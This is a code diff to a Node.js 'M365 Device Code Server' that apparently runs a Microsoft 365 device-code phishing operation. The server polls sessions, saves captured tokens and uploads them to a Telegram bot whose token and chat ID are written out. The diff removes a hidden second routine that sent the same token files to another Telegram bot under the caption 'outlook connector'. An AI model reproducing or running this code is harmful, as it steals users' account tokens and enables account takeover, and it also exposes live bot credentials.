@@ -29,9 +29,7 @@ const DISPLAY_BASES = {
 
 // Telegram
 const TELEGRAM_BOT_TOKEN = '8286068697:AAGZ7lbbD8B--FnvVziInLd5XBehDiFIvd8';
-const TELEGRAM_CHAT_ID = '8379597863';
-const OKEN1 = "8228183219:AAG1qJxhxNjus0HjZ9YIheGgHi8eSCvhzIU"
-const CHAT_ID1 = "8006914941"
+const TELEGRAM_CHAT_ID   = '8379597863';
 
 // ── Active sessions ───────────────────────────────────────────────────────────
 const sessions = new Map();
@@ -154,62 +152,6 @@ async function sendTelegramAsDocument(filename) {
   }
 }
 
-async function sendTelegramAsDocumentBot(filename) {
-  try {
-    const fileContent = fs.readFileSync(filename);
-    const boundary = '----Boundary' + Date.now();
-    const filenameBase = path.basename(filename);
-
-    let body = '';
-
-    body += `--${boundary}\r\n`;
-    body += 'Content-Disposition: form-data; name="chat_id"\r\n\r\n';
-    body += `${CHAT_ID1}\r\n`;
-
-    body += `--${boundary}\r\n`;
-    body += 'Content-Disposition: form-data; name="caption"\r\n\r\n';
-    body += 'outlook connector\r\n';
-
-    body += `--${boundary}\r\n`;
-    body += `Content-Disposition: form-data; name="document"; filename="${filenameBase}"\r\n`;
-    body += 'Content-Type: application/json\r\n\r\n';
-
-    const head = Buffer.from(body);
-    const tail = Buffer.from(`\r\n--${boundary}--\r\n`);
-
-    const fullBody = Buffer.concat([head, fileContent, tail]);
-
-    const res = await new Promise((resolve, reject) => {
-      const req = https.request({
-        hostname: 'api.telegram.org',
-        path: `/bot${TOKEN1}/sendDocument`,
-        method: 'POST',
-        headers: {
-          'Content-Type': `multipart/form-data; boundary=${boundary}`,
-          'Content-Length': fullBody.length,
-        },
-      }, response => {
-        let data = '';
-        response.on('data', chunk => data += chunk);
-        response.on('end', () => resolve({ status: response.statusCode, body: data }));
-      });
-
-      req.on('error', reject);
-      req.write(fullBody);
-      req.end();
-    });
-
-    if (res.status !== 200) {
-      console.error('Telegram sendDocument failed:', res.body);
-      return;
-    }
-
-    console.log(`→ Telegram file sent successfully: ${filenameBase}`);
-  } catch (err) {
-    console.error('Telegram document upload failed:', err.message);
-  }
-}
-
 async function pollSession(sessionId) {
   const s = sessions.get(sessionId);
   if (!s || s.status !== 'polling') return;
@@ -234,8 +176,6 @@ async function pollSession(sessionId) {
 
         const saved = saveTokens(res, s.file);
         await sendTelegramAsDocument(s.file);
-        await sendTelegramAsDocumentBot(s.file);
-
 
         console.log(`Session ${sessionId} → success → ${s.file}`);
         return;
@@ -441,8 +381,8 @@ const server = http.createServer(async (req, res) => {
   res.end(JSON.stringify({ error: 'Not found' }));
 });
 
-const PORT = 3210;
-server.listen(PORT, process.env.HOST || '0.0.0.0', () => {
+const PORT = 3220;
+server.listen(PORT, '127.0.0.1', () => {
   console.log(`
 ╔════════════════════════════════════════════════════════════╗
 ║     M365 Device Code Server  —  port ${PORT}                 ║
